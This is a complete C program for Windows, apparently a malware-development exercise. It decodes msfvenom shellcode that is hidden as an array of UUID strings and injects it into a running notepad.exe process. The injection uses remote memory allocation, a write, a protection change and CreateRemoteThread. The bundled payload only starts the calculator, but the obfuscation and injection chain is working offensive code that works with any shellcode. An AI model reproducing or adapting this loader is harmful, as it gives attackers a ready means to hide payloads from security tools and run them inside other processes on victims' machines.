#include <Windows.h>
#include <stdio.h>
#include <winternl.h> // For NTSTATUS, SYSTEM_PROCESS_INFORMATION, etc.

// Define NTSTATUS codes
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

// Define SystemProcessInformation (not always defined in winternl.h)
#define SystemProcessInformation 5

// UUID obfuscated shellcode (MSFVenom -p windows/x64/exec CMD=calc.exe)
char* UuidArray[] = {
    "E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52",
    "728B4820-4850-B70F-4A4A-4D31C94831C0", "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED",
    "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",
    "4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1",
    "F175E038-034C-244C-0845-39D175D85844", "4924408B-D001-4166-8B0C-48448B401C49",
    "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",
    "8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B",
    "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF", "C48348D5-3C28-7C06-0A80-FBE07505BB47",
    "6A6F7213-5900-8941-DAFF-D563616C632E", "00657865-9090-9090-9090-909090909090"
};

#define NumberOfElements 18

// Function to get a handle to a process by name using NtQuerySystemInformation
BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {
    // Function pointer for NtQuerySystemInformation
    typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
        );

    // Variable initialization
    fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;
    ULONG uReturnLen1 = 0, uReturnLen2 = 0;
    PSYSTEM_PROCESS_INFORMATION SystemProcInfo = NULL;
    NTSTATUS STATUS = 0;
    PVOID pValueToFree = NULL;

    // Get NtQuerySystemInformation address
    pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(
        GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation"
    );
    if (pNtQuerySystemInformation == NULL) {
        printf("[!] GetProcAddress Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    // First call to get the required buffer size
    STATUS = pNtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uReturnLen1);
    if (STATUS != STATUS_INFO_LENGTH_MISMATCH) {
        printf("[!] NtQuerySystemInformation (First Call) Failed With Error: 0x%0.8X\n", STATUS);
        return FALSE;
    }

    // Allocate memory for the process information array
    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uReturnLen1);
    if (SystemProcInfo == NULL) {
        printf("[!] HeapAlloc Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    // Save initial address for freeing later
    pValueToFree = SystemProcInfo;

    // Second call to get the actual process information
    STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
    if (STATUS != STATUS_SUCCESS) {
        printf("[!] NtQuerySystemInformation (Second Call) Failed With Error: 0x%0.8X\n", STATUS);
        HeapFree(GetProcessHeap(), 0, pValueToFree);
        return FALSE;
    }

    // Iterate through the process list
    while (TRUE) {
        if (SystemProcInfo->ImageName.Length && _wcsicmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {
            // Found the target process
            *pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
            *phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *pdwPid);
            if (*phProcess == NULL) {
                printf("[!] OpenProcess Failed With Error: %d\n", GetLastError());
                HeapFree(GetProcessHeap(), 0, pValueToFree);
                return FALSE;
            }
            break;
        }

        // Move to the next entry; stop if NextEntryOffset is 0
        if (!SystemProcInfo->NextEntryOffset)
            break;

        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
    }

    // Free allocated memory
    HeapFree(GetProcessHeap(), 0, pValueToFree);

    // Check if we found the process
    if (*pdwPid == 0 || *phProcess == NULL) {
        printf("[!] Process '%ws' Not Found or Handle Not Opened\n", szProcName);
        return FALSE;
    }

    return TRUE;
}

// Deobfuscate UUID-based shellcode
BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {
    PBYTE pBuffer = NULL, TmpBuffer = NULL;
    SIZE_T sBuffSize = 0;
    RPC_STATUS STATUS = 0;

    // Get UuidFromStringA address from Rpcrt4.dll
    typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(RPC_CSTR StringUuid, UUID* Uuid);
    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
    if (pUuidFromStringA == NULL) {
        printf("[!] GetProcAddress Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    // Calculate the real size of the shellcode (number of elements * 16)
    sBuffSize = NmbrOfElements * 16;

    // Allocate memory for the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    // Set TmpBuffer to point to the start of pBuffer
    TmpBuffer = pBuffer;

    // Loop through each UUID string and convert to binary
    for (SIZE_T i = 0; i < NmbrOfElements; i++) {
        if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
            printf("[!] UuidFromStringA Failed At [%s] With Error: 0x%0.8X\n", UuidArray[i], STATUS);
            HeapFree(GetProcessHeap(), 0, pBuffer);
            return FALSE;
        }
        TmpBuffer += 16; // Each UUID is 16 bytes
    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;
    return TRUE;
}

// Inject shellcode into the remote process
BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {
    PVOID pShellcodeAddress = NULL;
    SIZE_T sNumberOfBytesWritten = 0;
    DWORD dwOldProtection = 0;
    HANDLE hThread = NULL;

    // Allocate memory in the remote process
    pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAllocEx Failed With Error: %d\n", GetLastError());
        return FALSE;
    }
    printf("[i] Allocated Memory At: 0x%p\n", pShellcodeAddress);

    // Write the shellcode to the allocated memory
    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) ||
        sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("[!] WriteProcessMemory Failed With Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[i] Successfully Written %zu Bytes\n", sNumberOfBytesWritten);

    // Change memory protection to executable
    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
        printf("[!] VirtualProtectEx Failed With Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    // Create a remote thread to execute the shellcode
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[!] CreateRemoteThread Failed With Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    // Wait for the remote thread to complete
    printf("[i] Executing Shellcode...\n");
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Shellcode Executed!\n");

    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);
    return TRUE;
}

int main() {
    // Initialize variables
    LPCWSTR szProcName = L"notepad.exe";
    DWORD dwPid = 0;
    HANDLE hProcess = NULL;
    PBYTE pShellcode = NULL;
    SIZE_T sShellcodeSize = 0;

    // Step 1: Get the process handle
    if (!GetRemoteProcessHandle(szProcName, &dwPid, &hProcess)) {
        printf("[!] Failed to get handle for '%ws'\n", szProcName);
        return 1;
    }
    printf("[+] Successfully found '%ws' with PID: %u\n", szProcName, dwPid);
    printf("[+] Process Handle: 0x%p\n", hProcess);

    // Step 2: Deobfuscate the shellcode
    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pShellcode, &sShellcodeSize)) {
        printf("[!] Failed to deobfuscate shellcode\n");
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Deobfuscated shellcode: %zu bytes\n", sShellcodeSize);

    // Step 3: Inject and execute the shellcode
    if (!InjectShellcodeToRemoteProcess(hProcess, pShellcode, sShellcodeSize)) {
        printf("[!] Failed to inject shellcode\n");
        HeapFree(GetProcessHeap(), 0, pShellcode);
        CloseHandle(hProcess);
        return 1;
    }

    // Clean up
    HeapFree(GetProcessHeap(), 0, pShellcode);
    CloseHandle(hProcess);
    printf("[+] All operations completed successfully\n");

    return 0;
}
